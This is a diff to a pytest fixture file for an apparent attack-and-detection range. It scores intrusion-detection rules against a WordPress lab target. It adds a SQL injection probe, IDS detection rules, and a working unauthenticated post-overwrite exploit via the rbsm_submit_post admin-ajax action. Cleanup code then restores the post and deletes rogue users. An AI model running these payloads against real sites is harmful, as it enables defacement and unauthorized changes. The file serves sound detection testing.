@@ -12,7 +12,7 @@ from conftest import (
     PLATFORM_URL, TARGET_PUBLIC, credited_to, from_attacker, run_redteam,
     runs_the_declared_rules, score_when_ready, seen_by_both_engines, target_code,
 )
-from range import ATTACKER, BOARD, missing, run
+from range import ATTACKER, BOARD, missing, run, start_hint
 
 CONTROL = "board-sqli-search"
 UNION = "board-sqli-union-search"
@@ -30,12 +30,23 @@ BUFFERLESS = (
 )
 PORTED_RULE = 'alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"ported SQLi probe"; flow:established,to_server; http.uri; pcre:"/(\\x27[\\s+]*(or|and)[\\s+]*[\\x27\\d]|union[\\s+]+select|--[\\s+]|\\x27[\\s+]*--|\\x27[\\s+]*\\x29)/i"; sid:9009996; rev:1;)\n'
 NOT_A_RULE = "this is not a rule"
+CATCH_ALL = (
+    'alert http any any -> any any (msg:"SQL XSS traversal Restricted File"; '
+    'flow:established,to_server; http.uri; content:"/"; sid:9009997; rev:1;)\n'
+)
+CATCH_ALL_CASES = (
+    "board-sqli-search", "board-xss-script-tag-in-search", "board-path-traversal-static",
+    "board-normal-search", "board-normal-search-with-apostrophe",
+)
 
 DETECT_WITHOUT_BLOCKING_SEARCH = {
     "paranoia": 1,
     "exclusions": [{"rule_id": 949110, "target": "", "path": "/search/"}],
 }
 FABRICATED_LOOT = [{"username": "admin", "password": "admin1234"}]
+TERMINAL_ATTACK = "/search/?q=%27%20OR%201%3D1--"
+TERMINAL_BENIGN = "/search/?q=release"
+TERMINAL_GAP_SECONDS = 6
 
 CORP = "corp"
 CORP_DB = "corp-db"
@@ -43,6 +54,14 @@ CORP_HOST = "Host: corp.com"
 ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
 NONCE = re.compile(r'name="_wpnonce" value="([^"]+)"')
 AJAX_NONCE = re.compile(r'"ajaxSecurity":"([a-f0-9]+)"')
+SUBMISSION_NONCE = re.compile(r'rbGlobalSubmissionSettings = {"nonce":"([a-f0-9]+)"')
+DEFACED = {
+    "post_title": "Defaced by an unauthenticated guest",
+    "post_excerpt": "overwritten without owning this post",
+    "post_content": "overwritten without owning this post via rbsm_submit_post postId overwrite",
+}
+POST_FIELDS = ("post_title", "post_content", "post_excerpt", "post_status")
+WINDOW_GAP_SECONDS = 7
 
 
 def open_session(**settings) -> int:
@@ -315,13 +334,20 @@ def rules_session(stack_is_up):
 
         seen["noisy"] = apply_rules(baseline_rules + PORTED_RULE + NOISY_RULE, session_id)
         assert seen["noisy"].ok, seen["noisy"].text
-        for name in (CONTROL, UNION, BENIGN_SEARCH):
-            fired_case_id(session_id, name)
+        fired = {name: fired_case_id(session_id, name) for name in (CONTROL, UNION, BENIGN_SEARCH)}
+        seen["noisy_benign"] = fired[BENIGN_SEARCH]
+
+        caught_all = apply_rules(CATCH_ALL, session_id)
+        assert caught_all.ok, caught_all.text
+        seen["catch_all"] = {fired_case_id(session_id, name) for name in CATCH_ALL_CASES}
         close_session(session_id)
 
-        seen["after"] = score_when_ready(
-            session_id, until=lambda totals: totals["tp"] > 0 and totals["fp"] > 0
-        )
+        def ready(totals):
+            verdicts = {case["case_id"]: case["verdict"] for case in totals["per_case"]}
+            caught = [verdicts.get(case_id) for case_id in seen["catch_all"]]
+            return verdicts.get(seen["noisy_benign"]) == "FP" and "TP" in caught and "FP" in caught
+
+        seen["after"] = score_when_ready(session_id, until=ready)
         seen["listed"] = detections_of(session_id)
     return seen
 
@@ -365,6 +391,82 @@ def terminal_session(stack_is_up):
                 seen["moved"] = (token, attack_from_the_shell(token, session_id))
             finally:
                 requests.post(origin, json={"origin": "", "session": session_id}, timeout=60)
+    return seen
+
+
+def label_terminal(case_id, session_id):
+    response = requests.post(
+        f"{PLATFORM_URL}/api/attacker/label/",
+        json={"case_id": case_id, "session": session_id}, timeout=30,
+    )
+    assert response.ok, response.text
+
+
+def record_terminal_window(session_id, name, malicious, source_ip, started_at, ended_at, case_id=None):
+    response = requests.post(
+        f"{PLATFORM_URL}/api/sessions/{session_id}/cases/",
+        json={
+            "case_id": case_id or str(uuid.uuid4()),
+            "name": name,
+            "malicious": malicious,
+            "correlation": "window",
+            "source_ip": source_ip,
+            "started_at": started_at.isoformat(),
+            "ended_at": ended_at.isoformat(),
+        },
+        timeout=30,
+    )
+    assert response.status_code == 201, response.text
+
+
+def scored_by(session_id, strategy):
+    response = requests.get(
+        f"{PLATFORM_URL}/api/sessions/{session_id}/score/", params={"correlation": strategy}, timeout=60,
+    )
+    assert response.ok, response.text
+    return response.json()
+
+
+def verdicts_of(totals):
+    return {case["name"]: case["verdict"] for case in totals["per_case"]}
+
+
+@pytest.fixture(scope="session")
+def terminal_windows(stack_is_up):
+    with shared_session() as session_id:
+        attacker = requests.get(f"{PLATFORM_URL}/api/attacker/", params={"session": session_id}, timeout=60)
+        assert attacker.ok, f"the attacker box is not available: {attacker.text}. Run `{start_hint()}`."
+        source_ip = attacker.json()["source_ip"]
+
+        started = datetime.now(timezone.utc)
+        from_attacker(TERMINAL_BENIGN, session=session_id)
+        record_terminal_window(session_id, "terminal-benign", False, source_ip, started, datetime.now(timezone.utc))
+        time.sleep(TERMINAL_GAP_SECONDS)
+
+        started = datetime.now(timezone.utc)
+        from_attacker(TERMINAL_ATTACK, session=session_id)
+        record_terminal_window(session_id, "terminal-sqli", True, source_ip, started, datetime.now(timezone.utc))
+        time.sleep(TERMINAL_GAP_SECONDS)
+
+        labelled = str(uuid.uuid4())
+        label_terminal(labelled, session_id)
+        try:
+            started = datetime.now(timezone.utc)
+            from_attacker(TERMINAL_ATTACK, session=session_id)
+            ended = datetime.now(timezone.utc)
+        finally:
+            label_terminal(None, session_id)
+        record_terminal_window(session_id, "terminal-both-ways", True, source_ip, started, ended, labelled)
+
+    def ready(totals):
+        verdicts = verdicts_of(totals)
+        return (verdicts.get("terminal-sqli") == verdicts.get("terminal-both-ways") == "TP"
+                and seen_by_both_engines(session_id, totals, name="terminal-sqli"))
+
+    seen = {"session_id": session_id, "score": score_when_ready(session_id, until=ready)}
+    seen["sqli_seen_by_both"] = seen_by_both_engines(session_id, seen["score"], name="terminal-sqli")
+    seen["by"] = {strategy: scored_by(session_id, strategy) for strategy in ("marker", "window")}
+    seen["detections"] = detections_of(session_id)
     return seen
 
 
@@ -443,6 +545,67 @@ def flip(security, name, value, session=None):
     ], session=session).stdout.strip()
 
 
+def first_post(session=None):
+    out = run(CORP_DB, [
+        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
+        f"SELECT ID,{','.join(POST_FIELDS)} FROM wp_posts WHERE post_type='post' ORDER BY ID ASC LIMIT 1;",
+    ], session=session).stdout
+    post_id, *fields = out.rstrip("\n").split("\t", len(POST_FIELDS))
+    return {"ID": post_id, **dict(zip(POST_FIELDS, fields))}
+
+
+def post_row(post_id, session=None):
+    out = run(CORP_DB, [
+        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
+        f"SELECT {','.join(POST_FIELDS)} FROM wp_posts WHERE ID={post_id};",
+    ], session=session).stdout
+    return dict(zip(POST_FIELDS, out.rstrip("\n").split("\t", len(POST_FIELDS) - 1)))
+
+
+def submission_nonce(session=None):
+    page = run(ATTACKER, [
+        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
+        f"{TARGET_PUBLIC}/submit-a-story/",
+    ], session=session).stdout
+    found = SUBMISSION_NONCE.search(page)
+    assert found, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
+    return found.group(1)
+
+
+def overwrite_post(nonce, post_id, session=None):
+    return run(ATTACKER, [
+        "curl", "-s", "--max-time", "20",
+        "-H", CORP_HOST,
+        "--data-urlencode", "action=rbsm_submit_post",
+        "--data-urlencode", f"_nonce={nonce}",
+        "--data-urlencode", "formId=1",
+        "--data-urlencode", f"postId={post_id}",
+        "--data-urlencode", f"title={DEFACED['post_title']}",
+        "--data-urlencode", f"excerpt={DEFACED['post_excerpt']}",
+        "--data-urlencode", f"content={DEFACED['post_content']}",
+        "--data-urlencode", "userName=Anonymous Contributor",
+        "--data-urlencode", "userEmail=anon@example.com",
+        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php",
+    ], session=session).stdout.strip()
+
+
+def restore_post(original, session=None):
+    run(CORP, [
+        "wp", "--allow-root", "post", "update", original["ID"],
+        f"--post_title={original['post_title']}",
+        f"--post_excerpt={original['post_excerpt']}",
+        f"--post_status={original['post_status']}",
+    ], session=session)
+    quoted = "'" + original["post_content"].replace("'", "\\'") + "'"
+    run(CORP_DB, [
+        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
+        f"UPDATE wp_posts SET post_content={quoted} WHERE ID={original['ID']}",
+    ], session=session)
+    for meta in ("rbsm_form_id", "rbsm_author_info"):
+        run(CORP, ["wp", "--allow-root", "post", "meta", "delete", original["ID"], meta],
+            session=session)
+
+
 def corp_is_declared():
     absent = missing(CORP, CORP_DB)
     assert not absent, (
@@ -488,7 +651,8 @@ def rogue_admin_session(stack_is_up):
     corp_is_declared()
     with shared_session(scenario="corp") as session_id:
         baseline = admin_ids(session_id)
-        seen = {"session_id": session_id, "baseline": baseline, "created": set()}
+        original = first_post(session_id)
+        seen = {"session_id": session_id, "baseline": baseline, "created": set(), "original": original}
         try:
             time.sleep(2)
             fired_at = datetime.now(timezone.utc)
@@ -499,11 +663,19 @@ def rogue_admin_session(stack_is_up):
             seen["admins"] = admin_ids(session_id)
             seen["created"] = seen["admins"] - baseline
             record_corp_window(session_id, "corp-rogue-admin", fired_at, done_at)
+            time.sleep(WINDOW_GAP_SECONDS)
+            fired_at = datetime.now(timezone.utc)
+            seen["overwrite"] = overwrite_post(submission_nonce(session_id), original["ID"], session_id)
+            seen["overwritten"] = post_row(original["ID"], session_id)
+            done_at = datetime.now(timezone.utc)
+            record_corp_window(session_id, "corp-content-write", fired_at, done_at)
             seen.update(judged_corp(session_id))
         finally:
             for uid in sorted(seen["created"]):
                 delete_user(uid, session_id)
             seen["admins_left"] = admin_ids(session_id)
+            restore_post(original, session_id)
+            seen["restored"] = post_row(original["ID"], session_id)
     return seen
 
 
